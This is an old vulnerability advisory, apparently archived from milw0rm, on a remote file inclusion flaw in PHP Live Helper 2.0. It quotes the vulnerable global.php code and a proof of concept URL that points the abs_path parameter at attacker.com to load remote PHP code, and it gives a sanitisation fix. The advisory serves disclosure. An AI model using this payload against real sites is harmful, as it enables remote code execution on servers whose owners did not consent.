@@ -1,0 +1,95 @@
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_43$2006
+
+------------------------------------------------------------------------------
+[ECHO_ADV_43$2006] PHP Live Helper <= 2.0 (abs_path) Remote File Inclusion
+------------------------------------------------------------------------------
+
+Author		: Ahmad Maulana a.k.a Matdhule
+Date Found	: July, 02nd 2006
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv4333-matdhule-2006.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PHP Live Helper
+
+Application	: PHP Live Helper
+version		: Latest version [2.0]
+URL		: http://www.turnkeywebtools.com/phplivehelper
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+
+-----------------------global.php----------------------
+....
+<?PHP
+/*
+  global.php - 05/30/2006 - 5:27pm PST - 2.0
+  
+  PHP Live Helper
+  http://www.turnkeywebtools.com/phplivehelper/
+  
+  Copyright (c) 2001-2006 Turnkey Web Tools, Inc.
+*/
+
+define('PLH_SESSION_START', '1');
+
+////////////////////////////
+// Load Class & Secure Files
+////////////////////////////
+
+require_once $abs_path."/libsecure.php";
+include_once $abs_path."/include/class.browser.php";
+...
+----------------------------------------------------------
+
+Input passed to the "abs_path" parameter in global.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~
+
+http://target.com/[phplivehelper_path]/global.php?abs_path=http://attacker.com/inject.txt?
+
+Solution:
+~~~~~~~
+- Sanitize variable $abs_path on global.php.
+
+Notification:
+~~~~~~~~~~
+
+I've been contacting the web/software administrator to tell about this hole in his system, 
+but instead of giving  a nice response, he replied so rudely and arrogantly. 
+I recommend not to use this product for your own sake.
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~
+~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson   :)  
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ Solpotcrew Comunity , #jambihackerlink #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-08-07]
